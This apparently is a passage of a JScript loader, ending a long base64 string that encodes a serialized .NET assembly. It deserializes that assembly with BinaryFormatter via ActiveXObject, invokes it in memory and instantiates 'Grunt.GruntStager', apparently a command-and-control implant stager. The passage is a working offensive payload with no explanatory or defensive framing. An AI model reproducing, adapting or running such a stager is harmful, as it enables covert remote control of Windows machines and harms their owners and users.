"AAEBEoCtBCABAQIFAAASgLEGIAEBEoCxBSAAEoCxBQAAEoC5BiABARKAvQUVEh0BDgggABURNQETAAUV"+
"ETUBDgQgABMABSABEwAIBQACAg4OBCABAQ4FIAASgMEFIAIBDg4DIAAIBCABCAgEIAEODgMgAAIFAAIO"+
"DhwFIAEOHQUHIAIdBR0FAgUAABKA0QwABQESgNkIEoDZCAgHAAESgN0dBQYgAB0SgOEGIAAdEoDlBiAC"+
"HBwdHAUAABKA8QYAAw4ODg4JBwISPRUSHQEOBAABDg4EIAECDgUgARI9DgUgABKA+QYgARKA/Q4FIAEB"+
"EwAGIAIBEk0OBAcBElUGIAESURJNBSABARJJAwcBAgi3elxWGTTgiQMGEkkCBgICBg4DBhIYBwYVEmUC"+
"Dg4FAAEBHQ4DAAABCQACFRIdAQ4ODgQgABJJCiAEAhwSWRJdEWEEKAASSQgBAAgAAAAAAB4BAAEAVAIW"+
"V3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAEAQAAAAAAzEcAAAAAAAAAAAAA5kcAAAAgAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAANhHAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAA"+
"AP8lACAAEAAAAAAAQAAADAAAAPg3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEAAAAL1N5c3RlbS5SZWZs"+
"ZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlD"+
"bGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEB"+
"AQEAAwgNU3lzdGVtLlR5cGVbXQkLAAAACQcAAAAJCgAAAAYQAAAAL1N5c3RlbS5SZWZsZWN0aW9uLkFz"+
"c2VtYmx5IExvYWQoQnl0ZVtdLCBCeXRlW10pBhEAAAA9U3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkg"+
"TG9hZChTeXN0ZW0uQnl0ZVtdLCBTeXN0ZW0uQnl0ZVtdKQgAAAAKAQUAAAAEAAAABhIAAAAIVG9TdHJp"+
"bmcJBwAAAAYUAAAADlN5c3RlbS5Db252ZXJ0BhUAAAAlU3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0"+
"ZW0uT2JqZWN0KQYWAAAAJVN5c3RlbS5TdHJpbmcgVG9TdHJpbmcoU3lzdGVtLk9iamVjdCkIAAAACgEM"+
"AAAAAgAAAAYXAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVy"+
"CQcAAAAKCQcAAAAJFAAAAAkSAAAACgsA";
var stream = toStream(assembly_str);
var formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var array = new ActiveXObject('System.Collections.ArrayList');
var delegate = formatter.Deserialize_2(stream);
array.Add(undefined);
var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Grunt.GruntStager');